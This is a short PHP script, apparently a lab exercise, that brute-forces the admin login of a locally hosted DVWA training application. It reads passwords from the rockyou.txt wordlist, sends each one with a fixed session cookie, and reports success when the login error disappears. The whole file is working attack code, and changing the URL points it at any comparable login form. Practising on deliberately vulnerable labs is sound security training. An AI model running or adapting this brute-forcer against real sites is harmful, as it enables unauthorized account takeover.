<?php 
require 'vendor/autoload.php';
use \GuzzleHttp\Client;

$client = new Client();
const URL = "http://localhost:8080/DVWA-master/vulnerabilities/brute/?username=%s&password=%s&Login=Login#";
const HEADERS = ['Cookie' => 'security=low; __stripe_mid=37d68129-f74e-428b-90ce-72715d2b34fa; PHPSESSID=jl8h4o0kvofc4nji8okhbjpc4e'];


$file = new SplFileObject("../../rockyou.txt");
$dom = new DOMDocument();

while(!$file ->eof()): // start while

    $password = $file -> fgets();
    $response = $client->get(sprintf(URL , 'admin' ,  trim($password)) , ['headers' =>  HEADERS]);
    @$dom->loadHTML($response->getBody());
    $pre = $dom->getElementsByTagName('pre');

    if($pre -> length == 0):echo "\e[0;32m[+]\e[39m password found => \e[0;32m$password\e[39m"; exit();endif;

endwhile; // end while
?>